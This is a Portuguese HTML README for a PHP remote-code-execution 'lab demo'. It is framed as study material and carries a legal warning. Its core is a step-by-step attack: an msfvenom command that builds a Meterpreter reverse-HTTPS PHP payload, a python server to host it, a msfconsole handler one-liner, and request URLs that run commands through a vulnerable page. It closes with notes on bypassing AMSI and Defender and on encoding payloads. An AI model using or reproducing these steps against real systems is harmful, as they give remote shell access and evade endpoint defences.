<h1>PHP RCE Lab Demo (Apenas para Estudo)</h1>

<div class="warning">
AVISO LEGAL MUITO IMPORTANTE<br><br>
Este repositório é <strong>exclusivamente educacional</strong> e deve ser usado 
<strong>somente</strong> em ambientes isolados controlados por você 
(máquinas virtuais locais, sem conexão com redes reais ou de terceiros).<br><br>
Qualquer uso em sistemas sem autorização expressa e por escrito é crime 
(no Brasil: art. 154-A do Código Penal + Lei 14.155/2021).<br><br>
O autor <strong>não</strong> se responsabiliza por mau uso.
</div>

<h2>Objetivo deste repositório</h2>
<p>Demonstrar de forma controlada e didática:</p>
<ul>
    <li>Como uma vulnerabilidade RCE (Remote Code Execution) pode ser explorada em PHP</li>
    <li>Como payloads stageless do Metasploit (php/meterpreter_reverse_https) são entregues</li>
    <li>Limitações atuais de detecção (AMSI, Defender, EDR) em 2026</li>
</ul>

<p><strong>NÃO</strong> é um exploit funcional "pronto para usar" em ambientes reais.</p>

<h2>Como usar (apenas em lab isolado)</h2>

<h3>1. Ambiente recomendado</h3>
<ul>
    <li>VM Kali/Parrot (atacante)</li>
    <li>VM Windows 10/11 ou Linux (vítima) com XAMPP / Apache + PHP</li>
    <li>Rede interna (Host-Only ou NAT sem internet no alvo)</li>
</ul>

<h3>2. Gerar o payload stageless</h3>

<pre>
msfvenom -p php/meterpreter_reverse_https \
  LHOST=192.168.56.101 \
  LPORT=443 \
  -f raw > meter.php
</pre>

<h3>3. Hospedar o payload</h3>
<pre>
python3 -m http.server 8000
</pre>

<h3>4. Iniciar o handler</h3>
<pre>
msfconsole -q -x "
use multi/handler;
set payload php/meterpreter_reverse_https;
set LHOST 192.168.56.101;
set LPORT 443;
exploit -j
"
</pre>

<h3>5. Acessar a página vulnerável</h3>
<p>Copie o <code>vulnerable.php</code> para o servidor vítima (ex: <code>htdocs/vulnerable.php</code>)</p>

<pre>
http://ip-da-vitima/vulnerable.php?payload=1
http://ip-da-vitima/vulnerable.php?cmd=whoami&debug=1
</pre>

<h2>Limitações reais em 2026</h2>
<ul>
    <li>Windows Defender + AMSI bloqueia payloads Metasploit conhecidos na maioria dos casos</li>
    <li>EDRs (CrowdStrike, SentinelOne, etc.) detectam comportamento de reverse shell</li>
    <li>Instalação silenciosa de .exe / .apk / .ipa não é viável sem interação do usuário</li>
</ul>

<h2>Recomendações</h2>
<ul>
    <li>Desative Defender/AMSI apenas no lab para fins de aprendizado</li>
    <li>Nunca suba esse código em servidor real</li>
    <li>Use sempre em VMs isoladas</li>
</ul>

<h2>Licença</h2>
<p>MIT – mas com a ressalva de que o uso indevido é de responsabilidade exclusiva do usuário.</p>
<p><strong>Feito para estudo. Use com responsabilidade.</strong></p>

<div class="note">
<h3>O que fazer mais tarde (lembrete)</h3>
<ul>
    <li>Testar em duas VMs (Kali + Windows 10/11)</li>
    <li>Tentar o bypass AMSI básico via PowerShell antes do payload</li>
    <li>Documentar o que foi detectado pelo Windows Defender (capturas de tela)</li>
    <li>Experimentar variações: reverse_tcp vs reverse_https, porta 80 vs 443</li>
    <li>Comparar com payload gerado com encoders (ex: -e php/base64)</li>
</ul>
</div>

<footer>
Boa sorte no estudo — e <strong>mantenha tudo isolado</strong>.
</footer>
